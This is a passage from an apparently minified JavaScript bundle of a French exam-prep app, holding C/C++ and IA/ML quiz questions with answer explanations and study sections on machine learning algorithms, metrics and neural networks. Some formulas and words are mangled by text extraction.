 }`,o:["0 1 2 3","0 1 2","0 1 2 3 4","1 2 3"],a:1,e:"B) 0 1 2. La boucle ache 0, 1, 2. Quand i == 3, le break sort de la boucle avant d'acher 3. A est faux car 3 n'est pas aché. C serait le résultat sans le break."},{q:"En C++, qu'est-ce que la sémantique de déplacement (move semantics) ?",o:["Déplacer un objet d'un tableau à un autre","Transférer les ressources d'un objet temporaire au lieu de les copier","Déplacer un fichier sur le disque","Changer la position d'un itérateur"],a:1,e:"B) La sémantique de déplacement (C++11) permet de transférer les ressources internes d'un objet (typiquement un objet temporaire ou un objet marqué avec std::move()) au lieu de les copier. C'est bien plus ecace pour les objets volumineux (vecteurs, chaînes, etc.)."},{q:"Quel tri a une complexité O(n log n) dans tous les cas ?",o:["Tri rapide (Quicksort)","Tri par insertion","Tri fusion (Mergesort)","Tri à bulles"],a:2,e:"C) Tri fusion (Mergesort). Le tri fusion a une complexité O(n log n) dans le meilleur, le moyen et le pire cas. Le tri rapide est O(n log n) en moyenne mais O(n2 ) dans le pire cas. Les tris par insertion et à bulles sont O(n2 )."},{q:"En C, que fait fseek(fp, 0, SEEK_END) suivi de ftell(fp) ?",o:["Lit le dernier caractère du fichier","Ferme le fichier","Donne la taille du fichier en octets","Déplace le curseur au début"],a:2,e:`C) Donne la taille du fichier en octets. fseek(fp, 0, SEEK_END) déplace le curseur à la fin du fichier (offset 0 depuis la fin). ftell(fp) retourne la position actuelle du curseur, qui est donc le nombre d'octets dans le fichier. C'est la technique standard pour obtenir la taille d'un fichier en C. Bonne chance pour le concours ! Chapitre 18 Explications Détaillées, Règles et Notions à Mémoriser 18.1 Explications des codes C/C++ 18.1.1 Pointeurs – Explication complète ❍ Note Comment lire un code avec pointeurs 1 int x = 42; /* x est une variable contenant 42 */ 2 int * p = & x ; /* p est un pointeur vers x ( stocke l ' adresse de x ) */ 3 printf ( " % d " , * p ) ; /* * p = dereferencer : ac`}],M2={id:Nf,name:If,color:Mf,sections:Of,quiz:wf},O2=Object.freeze(Object.defineProperty({__proto__:null,color:Mf,default:M2,id:Nf,name:If,quiz:wf,sections:Of},Symbol.toStringTag,{value:"Module"})),Bf="ia",Ff="IA / ML",kf="#22d3ee",jf=[{id:"1.1",c:1,t:"IA, Machine Learning et Deep Learning",x:`❖ Définition Hiérarchie des domaines
  Intelligence Artificielle (IA) : Domaine vaste visant à créer des machines capables de simuler
   l'intelligence humaine (logique, règles si-alors, systèmes experts).
  Machine Learning (ML) : Sous-domaine de l'IA. Au lieu d'être programmés explicitement,
   les algorithmes "apprennent" des modèles à partir des données (statistiques).
  Deep Learning (DL) : Sous-domaine du ML. Utilise des réseaux de neurones artificiels
   multi-couches pour extraire automatiquement des caractéristiques complexes (images, texte,
   son).`},{id:"1.2",c:1,t:"Les 3 grands types d'apprentissage",x:`❍ Concept clé Paradigmes d'apprentissage
 1. Apprentissage Supervisé (Supervised Learning) :
     Le modèle est entraîné sur un dataset étiqueté (on donne l'entrée X et la sortie désirée Y ).
     Objectif : Prédire la cible Y pour de nouvelles données.
     Applications : Classification (discret) et Régression (continu).
 2. Apprentissage Non-Supervisé (Unsupervised Learning) :
     Le modèle reçoit des données non-étiquetées (X seul, pas de Y ).
     Objectif : Trouver des structures sous-jacentes ou des groupes.
     Applications : Clustering (K-Means), Réduction de dimensionnalité (PCA).
 3. Apprentissage par Renforcement (Reinforcement Learning) :
     Un Agent interagit avec un Environnement et apprend par essais/erreurs via un système
      de Récompenses (Reward) et de pénalités.
     Objectif : Maximiser la récompense cumulée (Q-Learning).

       2|          Métriques et Évaluation`},{id:"2.1",c:2,t:"Métriques de Classification",x:`❖ Définition Matrice de confusion
 Pour une classification binaire (Positif / Négatif ) :
        VP (Vrais Positifs / True Positives) : Prédit +, Réel +
        VN (Vrais Négatifs / True Negatives) : Prédit -, Réel -
        FP (Faux Positifs / False Positives) : Prédit +, Réel - (Erreur de type 1 )
        FN (Faux Négatifs / False Negatives) : Prédit -, Réel + (Erreur de type 2 )

 ➔    Formule Mathématique Formules des Métriques
  Exactitude (Accuracy) : Part des prédictions correctes.
   Accuracy = V P +VV N
                      P +V N
                        +F P +F N
  Précision (Precision) : Parmi ce qu'on a prédit positif, combien le sont vraiment ? (Utile si
      les Faux Positifs coûtent cher, ex: Spam).
      P recision = V PV+F
                       P
                          P
  Rappel (Recall / Sensibilité) : Parmi les vrais positifs, combien a-t-on détecté ? (Utile si
      les Faux Négatifs coûtent cher, ex: Cancer).
      Recall = V PV+F
                    P
                      N
  F1-Score : Moyenne harmonique de Precision et Recall (utile si les classes sont déséquilibrées).
   F 1 = 2 × PP recision×Recall
                recision+Recall

 ★    Astuce Concours
 L'  Accuracy (exactitude) est trompeuse si le dataset est déséquilibré. Exemple : 99% de transac-
 tions normales, 1% de fraudes. Un modèle qui prédit TOUJOURS "Normal" aura 99% d'accuracy
 mais sera inutile (Recall des fraudes = 0).`},{id:"2.2",c:2,t:"Métriques de Régression",x:`➔ Formule Mathématique Régression
 yi : vraie valeur, ŷi : prédiction, n : nb d'exemples.
      MAE (Mean Absolute Error) : M AE = n1 P ni=1 |yi − ŷi |
                                                     P
      MSE (Mean Squared Error) : M SE = n1 ni=1 (yi − ŷi )2 (Pénalise fortement les grandes
         erreurs).
                                             √
        RMSE (Root Mean Squared Error) : M SE (Même unité que la cible).
        R2 Score : Coecient de détermination (proche de 1 = modèle parfait, ≤ 0 = modèle pire
         que la moyenne).`},{id:"2.3",c:2,t:"Généralisation : Overfitting et Underfitting",x:`2.3. GÉNÉRALISATION : OVERFITTING ET UNDERFITTING

❖   Définition Généralisation
     Sous-apprentissage (Underfitting) : Le modèle est trop simple pour capturer la ten-
      dance des données (Biais élevé). L'erreur est forte sur Train et sur Test.
     Surapprentissage (Overfitting) :           Le modèle apprend par c÷ur le bruit des données
      d'entraînement (Variance élevée). L'erreur est très faible sur Train, mais très forte sur Test.

★   Astuce Concours
Comment combattre l'overfitting ?
    1. Obtenir plus de données (Data Augmentation).
    2. Réduire la complexité du modèle (moins de couches, de features).
    3. Ajouter de la   Régularisation (L1/Lasso, L2/Ridge).
    4. Early Stopping (arrêter l'entraînement avant la dégradation).
    5. Dropout (en Deep Learning).
    6. Validation Croisée (Cross-Validation).

            Part II

Algorithmes de Machine Learning

           Classique

     3|          Algorithmes Supervisés`},{id:"3.1",c:3,t:"Régression Linéaire",x:`➤ Algorithme / Modèle Régression Linéaire

 But : Prédire une valeur continue (ex: Prix d'une maison) via une combinaison linéaire des
 features.
 Formule : ŷ = w0 + w1 x1 + w2 x2 + ... + wn xn
     w0 : Biais (ordonnée à l'origine)
     wi : Poids (coecients)
 Optimisation : Minimiser la fonction de coût (MSE) via la Descente de Gradient ou la
 méthode des Moindres Carrés Ordinaires (OLS).`},{id:"3.2",c:3,t:"Régression Logistique",x:`➤ Algorithme / Modèle Régression Logistique

 But : Classification binaire (ex: Spam / Pas Spam).
 Malgré son nom, c'est un algorithme de classification.
    Applique la fonction Sigmoïde sur une régression linéaire pour obtenir une probabilité
       entre 0 et 1.
     Formule : P (y = 1|x) = σ(W T X) =       1
                                           1+e−W T X
     Frontière de décision : si P ≥ 0.5 ⇒ Classe 1, sinon Classe 0.`},{id:"3.3",c:3,t:"K-Nearest Neighbors (K-NN)",x:`➤ Algorithme / Modèle KNN - K Plus Proches Voisins

 But : Classification ou Régression. Algorithme non paramétrique (Lazy Learning : pas de phase
 d'entraînement stricte).
     Pour prédire un nouveau point, on calcule sa distance (ex: Euclidienne, Manhattan) avec
       tous les points du dataset.
     On sélectionne les K points les plus proches.
     Classification : Vote majoritaire parmi les K voisins.
     Régression : Moyenne des valeurs des K voisins.
 Piège : Sensible au choix de K (K impair évite les ex-æquo).          Nécessite impérativement de
 normaliser les données !`},{id:"3.4",c:3,t:"Support Vector Machines (SVM)",x:`3.4. SUPPORT VECTOR MACHINES (SVM)

 ➤   Algorithme / Modèle SVM - Machines à Vecteurs de Support
 But : Trouver l'hyperplan séparateur qui maximise la marge entre deux classes.
      Les vecteurs de support sont les points de données les plus proches de l'hyperplan (ceux qui
       définissent la marge).
      Astuce du Noyau (Kernel Trick) : Si les données ne sont pas linéairement séparables,
       on utilise un noyau (RBF, Polynomial, Linéaire) pour projeter les données dans un espace
       de dimension supérieure où elles le deviennent.`},{id:"3.5",c:3,t:"Arbres de Décision et Random Forest",x:`➤ Algorithme / Modèle Arbres de Décision (Decision Trees)

 But : Créer un modèle prédictif en séparant les données avec des conditions (SI feature_X >
 valeur ALORS...).
      Sélectionne à chaque n÷ud la feature qui sépare le mieux les classes, basé sur l'Impureté
       de Gini ou le Gain d'Information (Entropie).
      Très interprétable, mais sujet à l'overfitting massif si on ne limite pas la profondeur
       (pruning).

    Algorithme / Modèle Forêts Aléatoires (Random Forest) - Ensemble Learn-
 ing
 ➤

 Algorithme de type Bagging (Bootstrap Aggregating).
      Entraîne de multiples arbres de décision sur des sous-échantillons aléatoires (données et
       features).
      La prédiction finale est le vote majoritaire de tous les arbres.
      Réduit considérablement la variance et l'overfitting par rapport à un arbre seul.

     4|          Algorithmes Non-Supervisés`},{id:"4.1",c:4,t:"K-Means (Clustering)",x:`➤ Algorithme / Modèle K-Means
 But : Grouper les données en K clusters homogènes.
 Étapes :
   1. Initialiser aléatoirement K centroïdes.
   2.   Assignation : Associer chaque point de données au centroïde le plus proche.
   3.   Mise à jour : Recalculer la position du centroïde (moyenne des points du cluster).
   4. Répéter 2 et 3 jusqu'à convergence (les centroïdes ne bougent plus).
 Inconvénients : Il faut choisir K à l'avance (méthode du Coude/Elbow), sensible aux valeurs
 aberrantes (outliers), préfère les clusters sphériques.`},{id:"4.2",c:4,t:"PCA (Analyse en Composantes Principales)",x:`➤ Algorithme / Modèle PCA - Réduction de dimensionnalité

 But : Réduire le nombre de features (dimensions) tout en conservant le maximum de variance
 (d'information).
     Mathématiquement : Trouve les axes (Composantes Principales) qui maximisent la variance
        via la décomposition en valeurs propres de la matrice de covariance.
     Utilité : Visualisation 2D/3D, réduire le temps de calcul, éviter la malédiction de la dimen-
        sionnalité (Curse of Dimensionality).
     Les données DOIVENT être standardisées avant d'appliquer la PCA.

              Part III

Deep Learning et Réseaux de Neurones

      5|            Réseaux de Neurones Artificiels (ANN)`},{id:"5.1",c:5,t:"Le Neurone (Perceptron)",x:`❖ Définition Le Perceptron
 Unité de base d'un réseau de neurones. Il effectue :
        Somme pondérée : z = (wi · xi ) + b = W · X + b
                                      P
     1.
     2. Fonction d'activation : y = f (z) (introduit la non-linéarité !).
 Sans fonction d'activation non-linéaire, un réseau multi-couches ne serait qu'une simple régression
 linéaire.

 ❍   Concept clé Fonctions d'Activation
      Sigmoïde : Sortie entre [0, 1]. Utilisée en sortie pour la classification binaire. Problème :
          Disparition du gradient (Vanishing Gradient).
      Tanh : Sortie entre [-1, 1]. Centrrée sur zéro.
      ReLU (Rectified Linear Unit) : f (z) = max(0, z). Sortie 0 si négatif, linéaire si positif.
          Standard actuel pour les couches cachées (rapide, résout le vanishing gradient en partie).
      Softmax : Généralise la sigmoïde pour la classification multi-classes. Transforme les
          sorties en probabilités qui somment à 1. Toujours sur la dernière couche.`},{id:"5.2",c:5,t:"Apprentissage (Descente de Gradient & Backprop)",x:`➤ Algorithme / Modèle Entraînement d'un ANN

 1. Forward Propagation (Propagation avant) : Les données traversent le réseau de l'entrée
 vers la sortie pour faire une prédiction ŷ .
 2. Calcul de l'Erreur (Loss Function) : On compare la prédiction ŷ à la réalité y .
     Régression : MSE (Mean Squared Error)
     Classification binaire : Binary Cross-Entropy (Log Loss)
     Classification multi-classes : Categorical Cross-Entropy
 3. Backpropagation (Rétropropagation du gradient) :
      Calcule le gradient de la Loss par rapport à CHAQUE poids du réseau (utilisation de la
          règle de dérivation en chaîne / Chain Rule).
 4. Gradient Descent (Mise à jour des poids) :
      wnew = wold − α · ∂Loss
                          ∂w
      α = Learning Rate (Taux d'apprentissage). S'il est trop grand = le modèle diverge ;
          s'il est trop petit = apprentissage très lent.

 ❖   Définition Vocabulaire de l'entraînement
      Epoch (Époque) : Un passage complet de TOUT le dataset d'entraînement dans le réseau.
      Batch Size (Taille de lot) : Nombre d'exemples traités avant de mettre à jour les poids
          (ex: Mini-Batch SGD avec Batch=32).
      Itération : Nombre de batches nécessaires pour compléter une Epoch (Ex: 1000 images,
       Batch=100 ⇒ 10 itérations par Epoch).

     6|              Architectures Deep Learning`},{id:"6.1",c:6,t:"CNN - Réseaux de Neurones Convolutifs",x:`➤ Algorithme / Modèle CNN - Convolutional Neural Networks

                                                       Couches clés :
 Spécialisés pour les données spatiales (Images, Vidéos).
   1.   Convolution : Applique des filtres (kernels) glissants pour extraire des caractéristiques
        locales (bords, textures, formes).
   2. Activation (ReLU) : Apport de non-linéarité.
   3. Pooling (Max-Pooling) : Réduction de la dimension spatiale (downsampling). Rend le
        réseau invariant aux petites translations et réduit les calculs.
   4. Flatten : Aplatit la sortie 2D/3D en un vecteur 1D.
   5. Fully Connected (Dense) : Réseau classique à la fin pour la classification (Softmax).`},{id:"6.2",c:6,t:"RNN - Réseaux de Neurones Récurrents",x:`➤ Algorithme / Modèle RNN et LSTM

                données séquentielles (Séries temporelles, Texte/NLP, Audio).
 Spécialisés pour les
     RNN simple : Possède une boucle de rétroaction (mémoire interne) : l'état caché ht
      dépend de l'entrée actuelle xt ET de l'état précédent ht−1 .
     Problème du RNN : Vanishing Gradient sur les longues séquences (oubli à long terme).
     LSTM (Long Short-Term Memory) : Variante avancée avec des "portes" (Forget gate,
        Input gate, Output gate) qui décident de ce qu'il faut garder ou oublier. Résout le problème
        du Vanishing Gradient.
     Transformers (ex:        BERT, GPT) : Nouvelle architecture basée sur l'Attention (Self-
        Attention), remplaçant massivement les RNN pour le NLP moderne, car entraînable en
        parallèle.

    Part IV

Examens Blancs

     7|          Examen Blanc — IA & Machine Learning

★   Astuce Concours
Stratégie pour les QCM en IA :
  1. Différenciez Régression (chiffres continus) et Classification (catégories dis-
     crètes).
  2. Supervisé (données avec Y) vs Non-supervisé (sans Y, clusters).
  3. Rappelez-vous que la Régression Logistique sert à la Classification !
  4. Overfitting : très bon sur Train, mauvais sur Test.
  5. Si l'erreur MSE augmente sans cesse, le Learning Rate est sûrement trop élevé.`},{id:"9.1",c:9,t:"Explications détaillées des codes et formules",x:`9.1.1 Régression Linéaire – Explication pas à pas

  ❍   Concept clé Explication du modèle
  La formule de la régression linéaire est :

                                    ŷ = w0 + w1 x1 + w2 x2 + . . . + wn xn

  Lecture de la formule :
   ŷ : la prédiction (ex: prix prédit d'une maison).
   x1 , x2 , . . . , xn : les features (caractéristiques), ex: surface, nombre de chambres.
   w1 , w2 , . . . , wn : les poids (coecients). Plus wi est grand, plus xi influence la prédiction. Un
    wi négatif signifie que xi diminue ŷ .
   w0 : le biais (intercept). C'est la valeur prédite quand toutes les features valent 0.
  Comment le modèle apprend ?
      1. On initialise w0 , w1 , . . . aléatoirement ou à 0.
      2. On calcule ŷ pour chaque exemple du dataset.
                                   fonction de coût MSE : J = n1 (yi − ŷi )2 .
                                                                         P
      3. On calcule l'erreur via la

      4. On ajuste les poids pour diminuer J via la Descente de Gradient : wnew = wold −α·
                                                                                           ∂J
                                                                                           ∂w .
      5. On répète jusqu'à convergence (erreur stable).

9.1.2 Régression Logistique – Explication pas à pas

                                        9.1. EXPLICATIONS DÉTAILLÉES DES CODES ET FORMULES

  ❍   Concept clé Explication du modèle
  La formule de la régression logistique est :

                                        P (y = 1|x) = σ(W T X) =
                                                                     1 + e−W T X
  Lecture de la formule :
   W T X = w0 + w1 x1 + . . . : c'est exactement une régression linéaire qui produit un score
    z ∈] − ∞, +∞[.
   σ(z) = 1+e1−z : la sigmoïde compresse z dans [0, 1], ce qui donne une probabilité.
   Si z ≫ 0 : σ(z) → 1 (classe 1). Si z ≪ 0 : σ(z) → 0 (classe 0). Si z = 0 : σ(0) = 0.5 (frontière
      de décision).
  Décision :
        Si P (y = 1|x) ≥ 0.5 ⇒ Classe 1 (ex: Spam)
        Si P (y = 1|x) < 0.5 ⇒ Classe 0 (ex: Pas Spam)
  Fonction de coût : Binary Cross-Entropy (Log Loss) :
                                     1X
                                      J =−[yi · log(ŷi ) + (1 − yi ) · log(1 − ŷi )]
                                     n
        Si yi = 1 et ŷi → 1 : − log(1) = 0 (erreur nulle, parfait).
        Si yi = 1 et ŷi → 0 : − log(0) → +∞ (grosse pénalité).

9.1.3 K-NN – Explication pas à pas

  ❍   Concept clé Explication de l'algorithme
  Fonctionnement détaillé :
      1. On a un nouveau point xnew à classifier.
      2. On calcule la distance entre xnew et   tous
                                                p Pnles points du dataset :
           Distance Euclidienne : d(x, xnew ) =     i=1 (xi − xnew,i )
      3. On trie les distances par ordre croissant.
      4. On sélectionne les K points les plus proches (voisins).
      5.   Classification : Vote majoritaire. Ex: si K = 5, et parmi les 5 voisins il y a 3 «chat» et 2
           «chien» ⇒ Prédiction = «chat».
    6. Régression : Moyenne des valeurs des K voisins.
  Pourquoi normaliser ? Si une feature va de 0 à 1000 (ex: salaire) et une autre de 0 à 1 (ex:
  note), le salaire dominera totalement la distance. La normalisation met toutes les features à la
  même échelle.
  Choix de K :
        K petit (ex: 1) : très sensible au bruit ⇒ overfitting
        K grand (ex: 100) : trop général ⇒ underfitting
        K impair pour éviter les ex-æquo en classification binaire

9.1.4 K-Means – Explication pas à pas
  ❍   Concept clé Explication de l'algorithme
  À quoi sert K-Means ? Grouper des données non étiquetées en K groupes (clusters) ho-
  mogènes.
  Algorithme détaillé :
    1. Initialisation :                Choisir   aléatoirement   K    points   comme     «centroïdes»   initiaux
           (µ1 , µ2 , . . . , µK ).
      2.   Assignation : Pour chaque point xi , calculer d(xi , µk ) pour tous les K centroïdes. Assigner

                                        9.1. EXPLICATIONS DÉTAILLÉES DES CODES ET FORMULES

           xi au cluster dont le centroïde est le plus proche.
      3.   Mise à jour : Recalculer chaque centroïde = moyenne de tous les points assignés à son
           cluster.
                                convergence (les assignations ne changent plus).
      4. Répéter étapes 2-3 jusqu'à
  Méthode du Coude (Elbow Method) pour choisir K :
     Calculer l'inertie (somme des distances au centroïde) pour K = 1, 2, 3, . . .
       Tracer inertie vs K : le «coude» de la courbe indique le K optimal.

9.1.5 Réseau de Neurones – Explication complète

  ❍   Concept clé Explication détaillée
  1. Le Neurone (Perceptron) – Ce que fait CHAQUE neurone :
                               z = w1 x 1 + w2 x 2 + . . . + wn x n + b   (somme pondérée)

                                                 y = f (z)      (activation)

       xi : les entrées du neurone (sorties de la couche précédente ou features d'entrée).
       wi : poids (appris pendant l'entraînement) – déterminent l'importance de chaque entrée.
       b : biais (permet au neurone de s'activer même si toutes les entrées sont nulles).
       f : fonction d'activation (introduit la non-linéarité).
  2. Fonctions d'activation – Quand utiliser laquelle :
      ReLU max(0, z) : couches cachées (rapide, pas de vanishing gradient). Sortie : [0, +∞[
      Sigmoïde 1+e1−z : couche de sortie pour classification binaire. Sortie : [0, 1]
      Softmax : couche de sortie pour classification multi-classes. Sorties : probabilités
           sommant à 1.
       Tanh eez −e
                      z   −z
                      : sortie : [−1, 1]. Centré sur 0.
                 +e−z
  3. Forward Propagation : Les données traversent couche par couche de l'entrée vers la sortie.
  Chaque neurone calcule sa somme pondérée puis applique l'activation. Le résultat de la dernière`},{id:"9.2",c:9,t:"Toutes les définitions à mémoriser",x:`❖ Définition Glossaire complet IA/ML

    Terme                           Définition
    Intelligence Artificielle        Domaine visant à simuler l'intelligence humaine (règles, logique,
                                    apprentissage).
    Machine Learning                Sous-domaine de l'IA : les algorithmes apprennent des modèles à
                                    partir des données.
    Deep Learning                   Sous-domaine du ML : réseaux de neurones profonds (multi-
                                    couches).

    Apprentissage supervisé         Données étiquetées (X → Y ). Classification ou régression.
    Apprentissage       non   su-   Données sans étiquettes. Clustering, réduction de dimensionnalité.
    pervisé
    Apprentissage par ren-          Agent interagit avec un environnement via récompenses/pénalités.
    forcement

    Classification                   Prédire une   catégorie discrète (ex: spam/pas spam, chat/chien).
    Régression                      Prédire une   valeur continue (ex: prix, température).

                                                   9.3. RÈGLES FONDAMENTALES À MÉMORISER

   Clustering                     Regrouper des données similaires sans étiquettes.

   Feature         (caractéris-   Variable d'entrée (ex: surface, âge, couleur).
   tique)
   Label (cible)                  Variable de sortie à prédire en supervisé.
   Dataset   (jeu    de   don-    Ensemble d'exemples utilisés pour entraîner/tester.
   nées)

   Modèle                         Fonction paramétrée qui transforme des entrées en prédictions.
   Hyperparamètre                 Paramètre fixé AVANT l'entraînement (ex: K dans KNN, learning
                                  rate).
   Paramètre                      Valeur apprise PENDANT l'entraînement (ex: poids w , biais b).

   Overfitting                     Le modèle apprend le bruit. Excellent sur train, mauvais sur test.
   Underfitting                    Le modèle est trop simple. Mauvais sur train ET test.
   Généralisation                 Capacité à bien prédire sur des données       jamais vues.
   Descente de gradient           Algorithme d'optimisation : ajuste les poids dans la direction op-
                                  posée au gradient.
   Learning rate (α)              Taille du pas de la descente de gradient.
   Epoch                          Un passage complet du dataset dans le modèle.
   Batch                          Sous-ensemble du dataset traité avant mise à jour des poids.

   Neurone / Perceptron           Unité de base : somme pondérée + activation.
   Fonction d'activation          Introduit la non-linéarité (ReLU, Sigmoïde, Softmax, Tanh).
   Backpropagation                Calcul des gradients de la loss via la chain rule, de la sortie vers
                                  l'entrée.

   CNN                            Réseau convolutif, spécialisé pour les images (Convolution + Pool-
                                  ing + Dense).
   RNN                            Réseau récurrent, spécialisé pour les séquences (texte, audio, séries
                                  temporelles).
   LSTM                           RNN avancé avec portes (forget, input, output) pour la mémoire
                                  long terme.
   Transformer                    Architecture basée sur l'attention (Self-Attention), parallélisable.
                                  BERT, GPT.

   Noyau (Kernel)                 En SVM : projette dans un espace de dimension supérieure. En
                                  CNN : filtre glissant.
   Regularisation                 Technique     pour   limiter   l'overfitting    (L1/Lasso,    L2/Ridge,
                                  Dropout, Early stopping).
   Cross-Validation               Diviser les données en K folds et entraîner/tester K fois.`},{id:"9.3",c:9,t:"Règles fondamentales à mémoriser",x:`★ Astuce Concours 30 règles d'or IA/ML

   1. Supervisé = données avec Y (cible) ; Non supervisé = pas de Y .
   2. Classification = sortie catégorielle (discrète) ; Régression = sortie continue.
   3. La Régression Logistique est un algorithme de Classification (malgré son nom !).
   4. KNN est un Lazy Learner : pas de phase d'entraînement, il stocke toutes les données.
   5. KNN nécessite la normalisation des données.
   6.   K impair en KNN pour éviter les ex-æquo.
   7.   K petit en KNN ⇒ overfitting ; K grand ⇒ underfitting.
   8.   SVM cherche l'hyperplan qui maximise la marge.

                                                 9.4. NOTIONS ET CONCEPTS FONDAMENTAUX

     9.Kernel Trick : projette dans un espace de dimension supérieure pour séparer linéairement.
   10. Arbre de décision : utilise Gini ou Entropie pour choisir la meilleure feature.
   11. Random Forest = Bagging : plusieurs arbres + vote majoritaire.
   12. K-Means : algorithme de clustering itératif. Fixer K à l'avance.
   13. Méthode du Coude : pour choisir le bon K dans K-Means.
   14. PCA : les données DOIVENT être standardisées avant PCA.
   15. Overfitting : haute performance sur train, basse sur test (variance élevée).
   16. Underfitting : basse performance sur train ET test (biais élevé).
   17. Solutions overfitting : plus de données, régularisation (L1/L2), dropout, early stopping.
   18. Accuracy est trompeuse si les classes sont déséquilibrées.
   19. Précision : important quand les FP coûtent cher (ex: spam).
   20. Rappel : important quand les FN coûtent cher (ex: cancer, fraude).
   21.    F 1 = 2 × PP recision×Recall
                       recision+Recall (moyenne harmonique).
   22. MSE pénalise les grandes erreurs. MAE est plus robuste aux outliers.
   23. RMSE a la même unité que la cible (racine du MSE).
   24. ReLU : activation par défaut des couches cachées. max(0, z).
   25. Sigmoïde : sortie pour classification binaire. Sortie ∈ [0, 1].
   26. Softmax : sortie pour classification multi-classes. Somme des probas = 1.
   27. Learning rate trop grand ⇒ la loss diverge et oscille.
   28. Learning rate trop petit ⇒ convergence très lente.
   29. Backpropagation utilise la Chain Rule (règle de dérivation en chaîne).
   30. CNN = Images ; RNN/LSTM = Séquences (texte, audio).`},{id:"9.4",c:9,t:"Notions et concepts fondamentaux",x:`❍ Concept clé Biais vs Variance – Le compromis central
  Biais élevé : le modèle est trop simple, ne capture pas la tendance ⇒ underfitting.
  Variance élevée : le modèle est trop complexe, capture le bruit ⇒ overfitting.
  Objectif : trouver le juste milieu entre biais et variance.
  Augmenter la complexité du modèle : ↓ Biais, ↑ Variance.
  Ajouter de la régularisation : ↑ Biais, ↓ Variance.

 ❍   Concept clé Train / Validation / Test – à ne jamais confondre
  Train set (60-80%) : utilisé pour entraîner le modèle (ajuster les poids).
  Validation set (10-20%) : utilisé pour régler les hyperparamètres (ex: K , learning rate).
  Test set (10-20%) : utilisé une seule fois à la fin pour mesurer la performance finale.
  Règle : ne JAMAIS utiliser le test set pour choisir les hyperparamètres !

 ❍   Concept clé Régularisation L1 vs L2
  L1 (Lasso) : ajoute λ P|wi | au coût. Peut mettre des poids à zéro ⇒ sélection de features.
                         P
  L2 (Ridge) : ajoute λ wi2 au coût. Réduit les poids mais ne les annule pas.
  λ : hyperparamètre de régularisation. Grand λ = forte régularisation.

                                                           9.5. PIÈGES FRÉQUENTS AU CONCOURS

  ❍   Concept clé Couches d'un CNN – Ce que fait chaque couche
       Couche                   Opération                            Résultat
       Convolution              Filtre glissant (kernel)             Extraire bords, textures, formes
       ReLU                     max(0, z)                            Non-linéarité
       Max-Pooling              Prendre le max dans un carré         Réduire la dimension spatiale
       Flatten                  Aplatir 2D → 1D                      Vecteur pour le réseau Dense
       Dense (FC)               Réseau classique                     Classification finale (Softmax)`},{id:"9.5",c:9,t:"Pièges fréquents au concours",x:`☞ Attention / Piège 15 pièges classiques en IA/ML
      1. «Régression Logistique» ̸= régression. C'est de la   classification !
      2. L'Accuracy peut être de 99% et le modèle être inutile (classes déséquilibrées).
      3. KNN n'a pas de phase d'entraînement (lazy learning). Il est lent à la prédiction.
      4. K-Means n'est pas un algorithme de classification (c'est du clustering, non supervisé).
      5. Sans fonction d'activation non-linéaire, un réseau profond = une simple régression linéaire.
      6.   Random Forest est du Bagging (pas du Boosting).
      7. Le  Vanishing Gradient affecte les RNN simples et les Sigmoïdes.               ReLU et LSTM le
           résolvent.
      8. LePooling réduit la dimension spatiale, pas le Flatten (qui aplatit seulement).
      9.Corrélation ̸= Causalité. Deux variables corrélées n'ont pas forcément de lien causal.
    10. Les données de test ne doivent JAMAIS servir à choisir les hyperparamètres.
    11. PCA est un algorithme non supervisé (pas de labels Y ).
    12. K-Fold : K = nombre de plis, pas de voisins (KNN).
    13. SVM : hyperplan de     marge maximale, pas de distance minimale.
                                                 overfitting massif.
    14. Un arbre de décision sans pruning fait de l'
    15.    Softmax n'est utilisée qu'en dernière couche (jamais dans les couches cachées).`},{id:"9.6",c:9,t:"Tableau récapitulatif des algorithmes",x:`[Comparatif des algorithmes]

  Algorithme            Type           Tâche               Avantage                  Inconvénient
  Rég. linéaire         Supervisé      Régression          Simple, interprétable     Linéaire seulement
  Rég. logistique       Supervisé      Classification       Probabilités              Frontière linéaire
  KNN                   Supervisé      Class./Rég.         Simple,            pas    Lent, sensible échelle
                                                           d'entraînement
  SVM                   Supervisé      Classification       Kernel Trick, robuste     Coûteux         grands
                                                                                     datasets
  Arbre décision        Supervisé      Class./Rég.         Interprétable             Overfitting
  Random Forest         Supervisé      Class./Rég.         Réduit variance           Boîte noire
  K-Means               Non superv.    Clustering          Simple, rapide            Fixer K , sphérique
  PCA                   Non superv.    Réd. dim.           Visualisation             Perte d'info possible
  CNN                   Supervisé      Images              Auto features             Gourmand en calcul
  RNN/LSTM              Supervisé      Séquences           Mémoire temporelle        Vanishing (RNN)

MATHÉMATIQUES APPLIQUÉES
             Algèbre Linéaire, Probabilités & Statistiques
                Concours Master, IA & Data Science – Maroc

  Contenu :     Espaces vectoriels, applications linéaires, matrices, déter-
     minants, systèmes, réduction, espaces euclidiens, moindres carrés,
          dénombrement, probabilités conditionnelles, Bayes, vari-
            ables aléatoires, lois usuelles, inégalités, LGN, TCL,
   statistiques descriptives, régression, estimation (moments, maximum
    de vraisemblance), intervalles de confiance, tests d'hypothèses, χ , 2

         formulaire, erreurs classiques & 2 examens blancs corrigés.

                                 2025/2026`}],Uf=[{q:"Parmi les algorithmes suivants, lequel relève de l'apprentissage NON-supervisé ?",o:["Régression Linéaire","Forêt Aléatoire (Random Forest)","K-Means","Support Vector Machine (SVM)"],a:2,e:"Réponse : C) K-Means K-Means est un algorithme de clustering qui groupe des données sans qu'on lui fournisse de labels prédéfinis (Y ). Il cherche la structure dans les X . Les trois autres (Régression Linéaire, Random Forest, SVM) nécessitent un dataset étiqueté (su- pervisé)."},{q:`Votre modèle obtient une précision de 99% sur l'ensemble d'entraînement, mais seulement 65%
sur l'ensemble de test. Quel est le diagnostic probable et une solution possible ?`,o:["Sous-apprentissage (Underfitting) → Réduire la complexité du modèle","Surapprentissage (Overfitting) → Ajouter de la régularisation","Surapprentissage (Overfitting) → Entraîner sur moins de données","Sous-apprentissage (Underfitting) → Augmenter le Learning Rate"],a:1,e:"Réponse : B) Un écart massif entre l'entraînement (excellent) et le test (mauvais) est le symptôme classique du Surapprentissage (Overfitting). Pour le régler, il faut brider le modèle : ajouter de la régularisation (L1/L2, Dropout), diminuer la complexité, ou ajouter PLUS de données (et non pas moins !)."},{q:`Pourquoi utilise-t-on des fonctions d'activation (comme ReLU, Sigmoïde) dans les couches cachées
